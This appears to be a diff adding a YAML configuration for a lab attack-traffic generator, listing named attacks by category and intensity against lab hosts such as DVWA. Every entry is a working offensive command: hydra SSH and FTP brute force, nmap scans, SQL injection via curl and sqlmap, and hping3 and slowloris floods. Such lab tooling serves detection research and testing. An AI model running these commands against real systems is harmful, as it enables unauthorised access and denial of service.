@@ -1,0 +1,60 @@
+attacks:
+  - name: "SSH brute force – fast, low intensity"
+    category: "brute_force"
+    intensity: "low"
+    command: "hydra -l root -P /wordlists/small.txt ssh-lab ssh -s 2222 -t 1 -w 5"
+
+  - name: "SSH brute force – aggressive"
+    category: "brute_force"
+    intensity: "high"
+    command: "hydra -l root -P /wordlists/rockyou.txt ssh-lab ssh -s 2222 -t 8"
+
+  - name: "FTP brute force – login enumeration"
+    category: "brute_force"
+    intensity: "medium"
+    command: "hydra -L /wordlists/usernames.txt -p test ftp-lab ftp -s 21 -t 4"
+
+  - name: "Port scan – full range"
+    category: "port_scanning"
+    intensity: "high"
+    command: "nmap -sS -p- ssh-lab"
+
+  - name: "Port scan – fast (-F)"
+    category: "port_scanning"
+    intensity: "low"
+    command: "nmap -sS -F ftp-lab"
+
+  - name: "Port scan – stealthy with delay"
+    category: "port_scanning"
+    intensity: "medium"
+    command: "nmap -sS --scan-delay 200ms dvwa"
+
+  - name: "SQL injection – manual curl"
+    category: "sql_injection"
+    intensity: "low"
+    command: "curl 'http://dvwa:80/vulnerabilities/sqli/?id=1' --data-urlencode \"id=1' OR 1=1 --\""
+
+  - name: "SQL injection – sqlmap level 1"
+    category: "sql_injection"
+    intensity: "medium"
+    command: "sqlmap -u 'http://dvwa:80/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=fake' --level=1 --batch"
+
+  - name: "SQL injection – sqlmap level 5"
+    category: "sql_injection"
+    intensity: "high"
+    command: "sqlmap -u 'http://dvwa:80/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=fake' --level=5 --risk=3 --batch"
+
+  - name: "DDoS – hping3 flood"
+    category: "ddos"
+    intensity: "high"
+    command: "hping3 -S --flood -p 80 dvwa"
+
+  - name: "DDoS – slowloris 50 connections"
+    category: "ddos"
+    intensity: "medium"
+    command: "slowloris dvwa -p 80 -s 50"
+
+  - name: "DDoS – slowloris 200 connections"
+    category: "ddos"
+    intensity: "high"
+    command: "slowloris dvwa -p 80 -s 200"
